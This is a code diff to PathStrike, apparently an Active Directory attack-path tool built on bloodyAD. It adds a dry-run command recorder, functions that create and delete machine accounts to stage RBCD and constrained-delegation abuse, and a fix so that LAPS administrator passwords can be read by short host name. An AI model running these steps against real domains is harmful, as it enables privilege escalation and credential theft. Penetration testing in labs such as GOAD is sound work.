@@ -78,6 +78,10 @@ async def run_bloodyad(
     cmd = get_faketime_prefix() + _build_command(args, config, auth_args)
     logger.debug("Executing: %s", _redact_cmd(cmd))
 
+    from pathstrike.engine.command_emitter import placeholder_result, record_command
+    if record_command("bloodyAD", cmd, redacted=_redact_cmd(cmd)):
+        return placeholder_result("bloodyAD", cmd, subcommand=args[0] if args else None)
+
     result: dict[str, Any] = {
         "success": False,
         "output": "",
@@ -343,6 +347,46 @@ async def remove_rbcd(
     )
 
 
+async def add_computer(
+    config: PathStrikeConfig,
+    auth_args: list[str],
+    computer_name: str,
+    computer_pass: str,
+) -> dict[str, Any]:
+    """Create a controlled computer account via ``bloodyAD add computer``.
+
+    *computer_name* is the host name **without** the trailing ``$``.  Used to
+    stage an account with an SPN (so it can perform S4U2Self) for RBCD-based
+    attacks — including the RBCD-bridge used to abuse constrained delegation
+    that lacks protocol transition.  Requires ``ms-DS-MachineAccountQuota`` > 0
+    for the acting principal (default 10 in GOAD).
+    """
+    short = computer_name[:-1] if computer_name.endswith("$") else computer_name
+    return await run_bloodyad(
+        ["add", "computer", short, computer_pass],
+        config,
+        auth_args=auth_args,
+    )
+
+
+async def del_computer(
+    config: PathStrikeConfig,
+    auth_args: list[str],
+    computer_name: str,
+) -> dict[str, Any]:
+    """Delete a computer account (cleanup) via ``bloodyAD remove object``.
+
+    Accepts the name with or without a trailing ``$`` (bloodyAD resolves the
+    sAMAccountName, which carries the ``$``).
+    """
+    sam = computer_name if computer_name.endswith("$") else f"{computer_name}$"
+    return await run_bloodyad(
+        ["remove", "object", sam],
+        config,
+        auth_args=auth_args,
+    )
+
+
 async def add_shadow_credentials(
     config: PathStrikeConfig,
     auth_args: list[str],
@@ -420,11 +464,13 @@ async def read_laps(
 ) -> dict[str, Any]:
     """Read the LAPS password for *target* computer object.
 
-    Uses ``get object`` with the LAPS-specific attributes.
-    Appends ``$`` to the target if it doesn't already end with one
-    (computer objects have a trailing ``$`` in sAMAccountName).
+    Uses ``get object`` with the LAPS-specific attributes.  BloodHound names
+    computers by FQDN (``BRAAVOS.ESSOS.LOCAL``), but the sAMAccountName is the
+    short host name + ``$`` (``BRAAVOS$``) — passing the FQDN (or ``FQDN$``)
+    yields ``NoResultError``.  Normalise to ``SHORT$``.
     """
-    sam = target if target.endswith("$") else f"{target}$"
+    short = target.split("@")[0].split(".")[0]
+    sam = short if short.endswith("$") else f"{short}$"
     return await run_bloodyad(
         ["get", "object", sam, "--attr", "ms-mcs-admpwd,ms-LAPS-Password"],
         config,
